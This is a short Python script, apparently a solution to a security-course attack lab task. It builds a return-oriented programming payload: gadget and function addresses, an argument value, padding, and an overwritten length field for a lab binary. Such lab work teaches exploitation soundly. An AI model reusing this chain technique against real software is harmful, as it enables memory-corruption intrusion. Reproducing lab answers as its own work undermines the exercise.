#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b""

# jump to 0x4018a3 (pop rdi; ret;)
payload = payload + b"\xa3\x18\x40\x00\x00\x00\x00\x00"

# rdi <- 4
payload = payload + b"\x04\x00\x00\x00\x00\x00\x00\x00"

# jump to 0x401677 (grade_eval)
payload = payload + b"\x77\x16\x40\x00\x00\x00\x00\x00"

# padding
payload = payload + b"0" * (256 - 24)

# set len
payload = payload + b"\xa8\x00\x00\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)
